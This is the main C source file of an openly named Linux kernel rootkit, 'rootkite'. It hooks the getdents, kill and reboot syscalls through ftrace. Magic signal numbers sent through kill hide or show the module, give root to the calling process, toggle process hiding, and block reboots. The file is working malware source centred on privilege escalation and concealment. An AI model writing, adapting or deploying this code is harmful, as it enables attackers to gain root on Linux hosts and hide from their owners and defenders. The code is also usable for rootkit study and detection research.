#include <linux/init.h> // macros to mark up functions
#include <linux/module.h> // core header for loading lkms into the kernel
#include <linux/kernel.h> // types, macros, functions for kernel
#include <linux/kallsyms.h> // functions for kallsyms actions
#include <linux/unistd.h> // syscalls macros (checks for 32 bit and defines accordinly)
#include <asm/paravirt.h>
#include <linux/reboot.h> // reboot function

#include "kite_hook.h"
#include "device_handler.h"
#include "mod_hider.h"
#include "root_setter.h"
#include "getdents_hacks.h"
#include "hide_process.h"


MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("rootkite");
MODULE_AUTHOR("NondairyDig");
MODULE_VERSION("0.5");


#ifdef PTREGS_SYSCALL_STUB
static asmlinkage int hack_reboot(const struct pt_regs *regs){
    return -1; //return error when trying to reboot
}
#else
static asmlinkage int hack_reboot(int magic1, int magic2, unsigned int cmd, void* arg){
    return -1;
}
#endif

#ifdef PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs); // pretty self explanatory, in the README, activate and hook desired capabilities
static struct ftrace_hook ACTIVE_HOOKS[] = {
    HOOK("__x64_sys_getdents64", hack_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hack_getdents, &orig_getdents),
    HOOK("__x64_sys_kill", hack_kill, &orig_kill),
    HOOK("__x64_sys_reboot", hack_reboot, &orig_reboot)
};
#else
static asmlinkage long hack_kill(pid_t pid, int sig);
static struct ftrace_hook ACTIVE_HOOKS[] = {
    HOOK("sys_getdents64", hack_getdents64, &orig_getdents64),
    HOOK("sys_getdents", hack_getdents, &orig_getdents),
    HOOK("sys_kill", hack_kill, &orig_kill),
    HOOK("sys_reboot", hack_reboot, &orig_reboot)
};
#endif
#ifdef PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self explanatory, in the README, activate and hook desired capabilities
    int sig = regs->si;
    int pid = regs->di;
    if ( (sig == 64) && (pid == 1))
    {
        if(hidden == 0){
            printk(KERN_INFO "Hide pookkit\n");
            hide_mod();
        }
        else{
            printk(KERN_INFO "Show pookkit\n");
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        printk(KERN_INFO "Setting root for calling process\n");
        set_root();
        return 0;
    }
    else if ((sig == 63) && (pid == 1)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents64") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
        }
        switch_hide_process();
    }
    else if ((sig == 63) && (pid == 2)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
        }
    }
    return orig_kill(regs);
}
#else
static asmlinkage long hack_kill(pid_t pid, int sig){
    if ( (sig == 64) && (pid == 1))
    {
        if(hidden == 0){
            printk(KERN_INFO "Hide pookkit\n");
            hide_mod();
        }
        else{
            printk(KERN_INFO "Show pookkit\n");
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        printk(KERN_INFO "Setting root for calling process\n");
        set_root();
        return 0;
    }
    else if ((sig == 63) && (pid == 1)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents64") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
        }
        switch_hide_process();
    }
    else if ((sig == 63) && (pid == 2)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
        }
    }
    return orig_kill(pid, sig);
}
#endif


static int __init mod_init(void){
    printk(KERN_INFO "Activated rootkite, Initializing & Hooking Kill\n");
    misc_register(&controller); // register the device for interaction within filesystem
    if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "__x64_sys_kill") == 1){ //hook the kill function for interaction with the lkm
        printk(KERN_ERR "error hooking syscall %d\n", __NR_kill);
    }
    return 0;
}


static void __exit mod_exit(void){
    fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
    cleanup_lists();
    misc_deregister(&controller); // deregister the device controller
    if(hide_process_active == 1){
        switch_hide_process();
    }
    printk(KERN_INFO "rootkite: exit\n");
}


module_init(mod_init);
module_exit(mod_exit);